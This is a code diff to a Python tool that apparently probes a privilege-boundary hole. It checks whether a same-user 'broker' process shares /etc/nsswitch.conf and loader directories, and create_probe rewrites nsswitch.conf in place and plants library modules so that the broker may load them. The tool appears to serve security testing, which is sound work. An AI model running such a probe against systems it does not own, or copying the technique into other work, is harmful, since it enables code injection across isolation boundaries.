@@ -25,7 +25,7 @@ from pathlib import Path
 from typing import Any
 
 
-VERSION = "1.0"
+VERSION = "1.1"
 NSSWITCH = Path("/etc/nsswitch.conf")
 DEFAULT_WORK_ROOT = Path("/tmp/elt")
 STATE_FILENAME = "vega_nss_probe_active.json"
@@ -217,6 +217,54 @@ def library_directories(compiler: str | None) -> list[Path]:
     return result
 
 
+def file_identity(path: Path) -> tuple[int, int] | None:
+    try:
+        info = path.stat()
+        return info.st_dev, info.st_ino
+    except OSError:
+        return None
+
+
+def broker_path_visibility(
+    brokers: list[dict[str, Any]], directories: list[Path]
+) -> list[dict[str, Any]]:
+    """Check whether candidate config/module paths resolve to the same objects."""
+    local_nss_identity = file_identity(NSSWITCH)
+    local_dir_identities = {str(path): file_identity(path) for path in directories}
+    results: list[dict[str, Any]] = []
+
+    for broker in brokers:
+        pid = broker["pid"]
+        root = Path(f"/proc/{pid}/root")
+        target_nss = root / str(NSSWITCH).lstrip("/")
+        target_nss_identity = file_identity(target_nss)
+        if local_nss_identity is None or target_nss_identity is None:
+            nss_same: bool | None = None
+        else:
+            nss_same = local_nss_identity == target_nss_identity
+
+        shared_dirs: list[str] = []
+        unknown_dirs: list[str] = []
+        for directory in directories:
+            local_identity = local_dir_identities[str(directory)]
+            target_identity = file_identity(root / str(directory).lstrip("/"))
+            if local_identity is None or target_identity is None:
+                unknown_dirs.append(str(directory))
+            elif local_identity == target_identity:
+                shared_dirs.append(str(directory))
+
+        results.append(
+            {
+                "pid": pid,
+                "uid": broker["uid"],
+                "nsswitch_same_file": nss_same,
+                "shared_loader_directories": shared_dirs,
+                "unverified_loader_directories": unknown_dirs,
+            }
+        )
+    return results
+
+
 def preflight(compiler: str | None) -> dict[str, Any]:
     brokers = find_brokers()
     libc_text, libc_tuple = glibc_version()
@@ -231,6 +279,10 @@ def preflight(compiler: str | None) -> dict[str, Any]:
     same_uid = bool(brokers) and any(item["uid"] == os.getuid() for item in brokers)
     same_mount = bool(brokers) and any(
         item["mount_ns"] == self_mount_ns for item in brokers
+    )
+    broker_visibility = broker_path_visibility(
+        [item for item in brokers if item["uid"] == os.getuid()],
+        [Path(path) for path in writable_directories],
     )
 
     report: dict[str, Any] = {
@@ -251,6 +303,7 @@ def preflight(compiler: str | None) -> dict[str, Any]:
         "brokers": brokers,
         "same_uid_as_broker": same_uid,
         "same_mount_namespace_as_broker": same_mount,
+        "broker_path_visibility": broker_visibility,
     }
     return report
 
@@ -260,8 +313,6 @@ def preflight_outcome(report: dict[str, Any]) -> tuple[bool, str]:
         return False, "INCONCLUSIVE_NO_RUNNING_BROKER"
     if not report["same_uid_as_broker"]:
         return False, "NOT_VULNERABLE_TO_THIS_VECTOR_DIFFERENT_UID"
-    if not report["same_mount_namespace_as_broker"]:
-        return False, "NOT_VULNERABLE_TO_THIS_VECTOR_DIFFERENT_MOUNT_NAMESPACE"
     if not report["glibc_auto_reload"]:
         return False, "NOT_VULNERABLE_TO_LIVE_NSS_RELOAD_ON_THIS_GLIBC"
     if not report["nsswitch_writable_in_place"]:
@@ -270,7 +321,29 @@ def preflight_outcome(report: dict[str, Any]) -> tuple[bool, str]:
         return False, "NOT_VULNERABLE_TO_THIS_VECTOR_NO_WRITABLE_LOADER_DIRECTORY"
     if not report["compiler"]:
         return False, "INCONCLUSIVE_NO_NATIVE_COMPILER"
-    return True, "PREFLIGHT_VULNERABLE_CONDITIONS_PRESENT"
+    same_uid_visibility = [
+        item
+        for item in report["broker_path_visibility"]
+        if item["uid"] == report["uid"]
+    ]
+    if any(
+        item["nsswitch_same_file"] is True
+        and item["shared_loader_directories"]
+        for item in same_uid_visibility
+    ):
+        return True, "PREFLIGHT_VULNERABLE_CONDITIONS_PRESENT"
+    if any(
+        item["nsswitch_same_file"] is None
+        or (
+            item["nsswitch_same_file"] is True
+            and item["unverified_loader_directories"]
+        )
+        for item in same_uid_visibility
+    ):
+        return False, "INCONCLUSIVE_BROKER_PATH_VISIBILITY_UNVERIFIED"
+    if any(item["nsswitch_same_file"] is True for item in same_uid_visibility):
+        return False, "NOT_VULNERABLE_TO_THIS_VECTOR_NO_SHARED_LOADER_DIRECTORY"
+    return False, "NOT_VULNERABLE_TO_THIS_VECTOR_NSSWITCH_FILE_NOT_SHARED"
 
 
 def c_literal(value: str) -> str:
@@ -610,9 +683,11 @@ def create_probe(args: argparse.Namespace, report: dict[str, Any]) -> dict[str, 
     atomic_json(active_path, state)
 
     try:
-        write_in_place(NSSWITCH, modified_nss)
+        # Persist the cleanup intent before the in-place write can truncate or
+        # partially update nsswitch.conf.
         state["active"] = True
         atomic_json(active_path, state)
+        write_in_place(NSSWITCH, modified_nss)
 
         failures: list[str] = []
         for directory_text in report["writable_library_directories"]:
@@ -660,6 +735,13 @@ def print_preflight(report: dict[str, Any], outcome: str) -> None:
         "INFO",
         f"same_uid={report['same_uid_as_broker']} same_mount_ns={report['same_mount_namespace_as_broker']}",
     )
+    for item in report["broker_path_visibility"]:
+        emit(
+            "INFO",
+            f"broker_paths pid={item['pid']} nsswitch_same_file={item['nsswitch_same_file']} "
+            f"shared_loader_dirs={item['shared_loader_directories']} "
+            f"unverified_loader_dirs={item['unverified_loader_directories']}",
+        )
     emit(
         "INFO",
         f"nsswitch_writable={report['nsswitch_writable_in_place']} compiler={report['compiler']}",
@@ -790,7 +872,7 @@ def parser() -> argparse.ArgumentParser:
     result.add_argument(
         "--work-root",
         default=str(DEFAULT_WORK_ROOT),
-        help="persistent writable directory (default: /tmp/elt)",
+        help="writable artifact directory (default: /tmp/elt)",
     )
     result.add_argument("--port", type=int, default=8082, help="broker egress port")
     result.add_argument(
